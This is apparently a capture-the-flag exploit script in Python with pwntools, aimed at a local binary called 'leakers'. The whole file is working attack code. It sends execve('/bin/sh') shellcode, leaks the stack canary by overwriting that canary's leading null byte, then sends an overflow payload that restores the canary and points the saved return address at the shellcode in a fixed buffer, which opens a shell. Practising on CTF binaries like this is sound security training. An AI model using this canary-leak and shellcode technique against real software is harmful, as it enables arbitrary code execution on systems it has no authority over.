#!/usr/bin/python
from pwn import *
import time

# This challenge consists in a buffer overflow exploited by bypassing a canary throught address leaking.

context.terminal = ['tmux', 'splitw', '-h']
r = process("./leakers")
gdb.attach(r, """
	c
	""")

input("wait")

# Standerd position independent shellcode

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

r.send(shellcode)

time.sleep(0.1)		#triggers the short read

r.send("A"*105)		#104 to fill the buffer and 1 to skip the leading 0 of the canary

#separate the different parts of what we are receiving
r.recvuntil("> ")
r.recv(105)

#canary is what leaked plus a leading zero (here we then convert it to an integer with u64)
canary = u64(b"\x00" + r.recv(7))	

# Starting address of the buffer
wheretojump = 0x00404080

# Creating the payload to overwrite the canary with itslef and overwrite the EIP with the starting address of the buffer
payload = shellcode.ljust(104, b"A") + p64(canary) + b"B"*8 + p64(wheretojump)  #adding 8 bytes between canary and where because canary is before the base pointer so we overwrite it to then write the saved instruction pointer

r.send(payload)

time.sleep(0.1)		

r.interactive()